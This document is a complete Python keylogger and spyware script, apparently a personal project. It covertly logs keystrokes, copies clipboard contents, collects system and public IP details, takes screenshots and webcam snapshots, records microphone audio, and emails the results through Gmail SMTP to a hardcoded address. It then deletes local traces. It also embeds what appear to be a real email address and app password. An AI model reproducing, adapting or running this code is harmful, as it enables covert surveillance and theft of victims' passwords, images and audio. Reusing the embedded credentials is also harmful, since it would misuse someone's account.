# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
from requests import get
from cv2 import VideoCapture, imshow, imwrite, destroyWindow, waitKey
from PIL import ImageGrab

# Global Variables
keys_info = "key_log.txt"
system_info = "system_info.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"
webCamShot_info = "webCamera.png"

keys_info_e = "e_key_log.txt"
system_info_e = "e_system_info.txt"
clipboard_info_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = "aaftab231@gmail.com"  # Enter your email here
password = "wqvy ntmz uamm kdls"  # Enter your email password here
toaddr = "kaaftab.cc@myamu.ac.in"  # Enter the recipient's email address

# Generate or read the encryption key using Fernet.generate_key()
encryption_key_file = "encryption_key.txt"

try:
    # Try to read the key from the file
    with open(encryption_key_file, 'rb') as key_file:
        key = key_file.read()
except FileNotFoundError:
    # If the file doesn't exist, generate a new key and save it to the file
    key = Fernet.generate_key()
    with open(encryption_key_file, 'wb') as key_file:
        key_file.write(key)

file_path = "C:\\Users\\Aaftab\\Documents\\KeyloggerFiles" # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend

# Ensure the directories exist
for directory in [file_path, file_merge]:
    os.makedirs(directory, exist_ok=True)

# Send Email
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    
    with smtplib.SMTP('smtp.gmail.com', 587) as s:
        s.starttls()
        s.login(fromaddr, password)
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)

# Get System Information
def system_information():
    with open(file_merge + system_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (May be due to max query) \n")

        f.write("Processor Info: " + (platform.processor()) + '\n')
        f.write("System Info: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

# Copy Clipboard Data
def copy_clipboard():
    with open(file_merge + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data : \n" + pasted_data + '\n')
        except Exception as e:
            f.write("Clipboard Could not be copied. \n" + str(e))

# Get Microphone Recordings
def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds*fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_merge + audio_info, fs, myrecording)

# Get Screenshots
def screenshots():
    im = ImageGrab.grab()
    im.save(file_merge + screenshot_info)

# Get Snap with WebCamera
def webCamera():
    cam = VideoCapture(0)
    result, image = cam.read()
    if result:
        imwrite(file_merge + webCamShot_info, image)

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for KeyLogger
while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys.clear()

    def write_file(keys):
        with open(file_merge + keys_info, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                elif k.find("Key") == -1:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_merge + keys_info, "w") as f:
            f.write(" ")

        screenshots()
        send_email(screenshot_info, file_merge + screenshot_info, toaddr)

        webCamera()
        send_email(webCamShot_info, file_merge + webCamShot_info, toaddr)

        copy_clipboard()
        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Encrypting Files
files_to_encrypt = [system_info, clipboard_info, keys_info]
encrypted_file_names = [system_info_e, clipboard_info_e, keys_info_e]
for i, encrypting_file in enumerate(files_to_encrypt):
    with open(file_merge + encrypting_file, 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    with open(file_merge + encrypted_file_names[i], 'wb') as f:
        f.write(encrypted)
    send_email(encrypted_file_names[i], file_merge + encrypted_file_names[i], toaddr)

time.sleep(120)

# Cleaning up and deleting files
delete_files = [system_info, clipboard_info, keys_info, screenshot_info, audio_info]
for file in delete_files:
    os.remove(file_merge + file)
